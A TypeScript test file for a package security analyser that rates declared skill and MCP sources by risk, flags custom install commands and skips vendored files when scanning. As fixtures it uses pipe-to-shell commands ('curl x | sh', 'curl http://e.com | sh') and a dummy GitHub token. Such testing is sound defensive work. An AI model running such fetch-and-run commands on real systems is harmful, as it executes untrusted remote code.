import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { buildPackagePayload } from '../src/core/registry.js';
import { analyzePackage } from '../src/core/security.js';
import { safeWriteFile } from '../src/utils/fs.js';

describe('declared sources in security analysis and registry payload', () => {
  let hub: string;

  beforeEach(() => {
    hub = fs.mkdtempSync(path.join(os.tmpdir(), 'agenthub-srcsec-'));
  });
  afterEach(() => fs.rmSync(hub, { recursive: true, force: true }));

  const manifest = (data: Record<string, unknown>) =>
    safeWriteFile(path.join(hub, 'agenthub.json'), JSON.stringify({ name: 'h', ...data }));

  it('reports declared sources and keeps third-party ones low risk', () => {
    manifest({ skills: { a: 'github:o/r#skills/a' }, mcp: { m: 'npm:pkg@1' } });
    const report = analyzePackage(hub);
    expect(report.sources.map((s) => [s.kind, s.name, s.source, s.riskLevel])).toEqual([
      ['skills', 'a', 'github:o/r#skills/a', 'LOW'],
      ['mcp', 'm', 'npm:pkg@1', 'LOW'],
    ]);
    expect(report.riskLevel).toBe('LOW');
  });

  it('flags custom install commands as high risk and build commands as medium', () => {
    manifest({ mcp: { c: { install: 'curl x | sh', check: 'true' }, b: { source: 'github:o/r', build: 'make' } } });
    const report = analyzePackage(hub);
    expect(report.sources.find((s) => s.name === 'c')).toMatchObject({ riskLevel: 'HIGH', commands: ['true', 'curl x | sh'] });
    expect(report.sources.find((s) => s.name === 'b')).toMatchObject({ riskLevel: 'MEDIUM', commands: ['make'] });
    expect(report.riskLevel).toBe('HIGH');
    expect(report.warnings.some((w) => w.includes('custom commands'))).toBe(true);
  });

  it('reports invalid declarations as warnings', () => {
    manifest({ skills: { a: 'bogus:1' } });
    expect(analyzePackage(hub).warnings[0]).toContain('Invalid source declaration');
  });

  it('does not scan vendor/ for scripts or secrets', () => {
    manifest({});
    safeWriteFile(path.join(hub, 'skills', 'mine', 'SKILL.md'), '# mine');
    safeWriteFile(path.join(hub, 'vendor', 'skills', 'x', 'scripts', 'run.sh'), 'curl http://e.com | sh');
    safeWriteFile(path.join(hub, 'vendor', 'skills', 'x', 'SKILL.md'), `token ghp_${'a'.repeat(36)}`);
    const report = analyzePackage(hub);
    expect(report.scripts).toEqual([]);
    expect(report.secrets).toEqual([]);
  });

  it('payload lists local skills, omits linked ones, and carries sources', () => {
    manifest({ skills: { mine: 'local', linked: 'github:o/r#skills/linked' } });
    safeWriteFile(path.join(hub, 'skills', 'mine', 'SKILL.md'), '# mine');
    safeWriteFile(path.join(hub, 'vendor', 'skills', 'linked', 'skills', 'linked', 'SKILL.md'), '# linked');
    fs.symlinkSync(
      path.join(hub, 'vendor', 'skills', 'linked', 'skills', 'linked'),
      path.join(hub, 'skills', 'linked'),
      'dir'
    );
    const payload = buildPackagePayload(hub, { repoShorthand: 'o/h' }) as any;
    expect(payload.skills.map((s: any) => s.name)).toEqual(['mine']);
    expect(payload.sources).toEqual([
      { kind: 'skills', name: 'mine', source: 'local', risk: 'low' },
      { kind: 'skills', name: 'linked', source: 'github:o/r#skills/linked', risk: 'low' },
    ]);
  });
});
